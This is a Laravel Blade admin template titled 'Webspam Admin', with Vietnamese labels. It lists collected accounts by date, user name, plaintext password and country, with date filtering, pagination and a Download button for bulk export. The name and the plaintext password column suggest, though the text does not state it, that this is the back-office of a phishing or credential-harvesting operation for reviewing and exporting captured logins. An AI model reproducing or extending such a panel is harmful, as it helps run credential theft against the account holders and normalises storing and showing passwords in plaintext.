<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Webspam Admin</title>
    <link rel="stylesheet" href="{{ asset('css/backend/main.css') }}">
</head>

<body>
    <div class="admin">
        <div class="container">
            <div class="admin__header">
                <nav class="navbar" style="background-color: #e3f2fd;">
                    <div class="container-fluid">
                        <a class="navbar-brand">Admin Webspam</a>
                        <form class="d-flex">
                            <input class="form-control me-2" type="search" placeholder="Search" aria-label="Search">
                            <button class="btn btn-outline-success" type="submit">Search</button>
                        </form>
                    </div>
                </nav>
            </div>

            <div class="admin__content">
                <h2>Tổng số acc : {{ $accounts->total() }} .</h2>
                <table class="table table-striped table-hover mt-2">
                    <thead>
                        <tr>
                            <th scope="col">#</th>
                            <th scope="col">
                                <div class="dropdown">
                                    <button class="date-dropdown-btn date-dropdown-btn--js" type="button">
                                        Date <span class="filter-status filter-status--js">Filtered</span>
                                        <i
                                            class="bi bi-caret-down-fill date-dropdown-btn-icon date-dropdown-btn-icon--js"></i>
                                    </button>
                                    <div class="datepicker-dropdown-menu--js datepicker-dropdown-menu">
                                        <form action="" method="GET" class="filter-date filter-date--js">
                                            <div class="fromDate-wrapper ">

                                                <input type="text" id="fromDate" name="fromDate"
                                                    class="input-date from-date from-date--js" readonly
                                                    placeholder="select begin date" data-bs-toggle="tooltip"
                                                    data-bs-placement="left" title="tháng/ngày/năm">
                                                <span class="input-title">
                                                    to
                                                </span>
                                                <input type="text" id="toDate" name="toDate"
                                                    class="to-date to-date--js input-date "
                                                    placeholder="select end date" readonly data-bs-toggle="tooltip"
                                                    data-bs-placement="right" title="tháng/ngày/năm">
                                            </div>
                                            <div class="datePicker-btn">
                                                <button class="btn btn-primary filter-btn" type="submit"
                                                    data-bs-toggle="tooltip" data-bs-placement="bottom"
                                                    title="Lọc">Submit
                                                    Filter
                                                </button>
                                                <button class="reset-btn btn btn-danger filter-btn" type="reset"
                                                    data-bs-toggle="tooltip" data-bs-placement="bottom"
                                                    title="Xóa bộ lọc">
                                                    Reset Filter
                                                </button>
                                            </div>
                                            <div class="datePicker-note">
                                                <span>Lưu ý: </span><small>Chọn đầu cuối thì sẽ lấy khoảng giữa</small>
                                            </div>
                                        </form>
                                    </div>
                                </div>

                            </th>
                            <th scope="col">User Name</th>
                            <th scope="col">Password</th>
                            <th scope="col">Country</th>
                        </tr>
                    </thead>
                    <tbody>
                        @foreach ($accounts as $key => $account)
                            <tr>
                                <th scope="row">{{ $key + 1 }}</th>
                                <td>{{ $account->created_at }}</td>
                                <td>{{ $account->acc }}</td>
                                <td>{{ $account->pass }}</td>
                                <td>{{ $account->locale }}</td>
                            </tr>
                        @endforeach
                    </tbody>
                </table>
                {{ $accounts->links('backend.paginate') }}
            </div>
            <div class="admin__download d-flex">

                <button type="button" class="btn btn-success download-btn--js">Download</button>
            </div>
        </div>
    </div>




    <script src="{{ asset('js/backend/index.js') }}"></script>
</body>

</html>
